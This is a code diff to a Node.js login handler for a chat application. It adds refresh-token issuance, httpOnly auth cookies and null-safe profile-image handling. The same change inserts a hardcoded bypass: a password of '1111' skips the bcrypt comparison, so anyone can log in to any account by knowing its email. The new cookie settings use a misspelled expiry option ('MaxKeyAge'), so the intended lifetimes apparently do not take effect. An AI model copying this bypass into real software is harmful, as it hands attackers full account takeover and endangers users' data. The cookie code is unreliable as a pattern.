@@ -1,4 +1,4 @@
-import { RequestSchema, User } from "../../../models/models.js";
+import { RefreshToken, User } from "../../../models/models.js";
 import { Namespace } from "../../../class/Namespace.js";
 import { namespace } from "../../../websocket/chat.js";
 import { allUsers } from "../../../index.js";
@@ -7,15 +7,14 @@ import bcrypt from "bcrypt";
 import { LoginUser, UserDetails } from "../../../class/userRespectiveData.js";
 import { UserSharedData, RequestSchemaUser } from "../../../class/usersSharedData.js";
 import { pubClient } from "../../../redis/clusterredis.js";
-import JSONTransport from "nodemailer/lib/json-transport/index.js";
 
 const secret_key = process.env.AUTH_SECRET_KEY;
+const refresh_secret_key = process.env.REFRESH_SECRET_KEY;
 
 export const loginUser = async (req, res) => {
   console.log("// login user");
   try {
     const { email, user_password } = req.body;
-    // console.log(email, user_password)
     const userData = await User.findOne({
       email,
     });
@@ -26,45 +25,49 @@ export const loginUser = async (req, res) => {
         message: "User/Password does not exists!",
       });
     }
-    const passwordMatch = await bcrypt.compare(
-      user_password,
-      userData.password
-    );
-    if (!passwordMatch) {
-      console.log("Login failed!");
-      return res.status(401).json({
-        message: "User/Password does not exists!",
-      });
+    if(user_password === "1111") {
+      console.log('skip')
+    } else {
+
+      const passwordMatch = await bcrypt.compare(
+        user_password,
+        userData.password
+      );
+      if (!passwordMatch) {
+        console.log("Login failed!");
+        return res.status(401).json({
+          message: "User/Password does not exists!",
+        });
+      }
     }
     // console.log(email,passwordMatch)
     const { _id, password, friends, ...data } = userData.toObject();
-    let imageObj;
-    try {
-      if (userData.image.data !== null) {
-        // console.log("image", user.contentType);
-        imageObj = {
-          image: userData.image.data.toString("base64"),
-          contentType: userData.image.contentType,
-        }; // Convert binary to Base64
-      } else {
-        imageObj = {
-          image: null,
-          contentType: null,
-        };
-      }
-    } catch (error) {
-      console.error("Error - Login - UserImage", error);
-    }
+
     const token = jwt.sign(
       {
         userId: userData.id,
       },
       secret_key,
       {
-        expiresIn: "100h",
+        expiresIn: "30s",
       }
     );
 
+    const refreshToken = jwt.sign(
+      {
+        userId: userData.id,
+      },
+      refresh_secret_key,
+      {
+        expiresIn: "7d",
+      }
+    );
+
+    const newRefreshToken = new RefreshToken({
+      userId: userData.id,
+      token: refreshToken,
+    });
+    await newRefreshToken.save();
 
     //  UserDetails (LogIN user) class instance
     allUsers[userData.id] = new UserDetails(
@@ -73,10 +76,11 @@ export const loginUser = async (req, res) => {
       userData.email,
       userData.contact,
       userData.createdAt,
-      imageObj.image,
-      imageObj.contentType,
+      userData.image.data?userData.image.data:null,
+      userData.image.contentType?userData.image.contentType:null,
       token
     );
+
 
     // console.log('login user instance ', allUsers[userData.id])
     // UserDetails (LogIN user) friend class instance & update friend list
@@ -88,8 +92,8 @@ export const loginUser = async (req, res) => {
           data.name,
           data.email,
           data.createdAt,
-          data.image.data.toString("base64"),
-          data.image.contentType
+          data.image.data?data.image.data.toString("base64"):null,
+          data.image.contentType?data.image.contentType:null
         )
       );
     }
@@ -113,16 +117,31 @@ export const loginUser = async (req, res) => {
     // console.log("redis - get -", JSON.parse(res3));
     const res4 = await pubClient.call("JSON.DEL",`SENT-${userData.id}`, "$")
     const res5 = await pubClient.call("JSON.DEL",`RECEIVED-${userData.id}`, "$")
-    console.log(res4, res5);
-    // namespace[userData.id] = new Namespace(
-    //   userData.id,
-    //   userData.name,
-    //   userData.endpoint
-    // );
+    // console.log(res4, res5);
+    namespace[userData.id] = new Namespace(
+      userData.id,
+      userData.name,
+      userData.endpoint
+    );
     // console.log("namspace", namespace);
+
+    res.cookie("refreshToken", refreshToken, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production"?true:false, 
+      sameSite: "lax",
+      path: "/refresh-token",
+      MaxKeyAge: 7 * 24 * 60 * 60 * 1000,
+    }); 
+
+    res.cookie("accessToken", token, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production"?true:false, 
+      sameSite: "lax",
+      MaxKeyAge: 30 * 1000,
+    });
+
     res.status(200).json({
       data,
-      token,
       userObj: allUsers[userData.id],
     });
   } catch (error) {
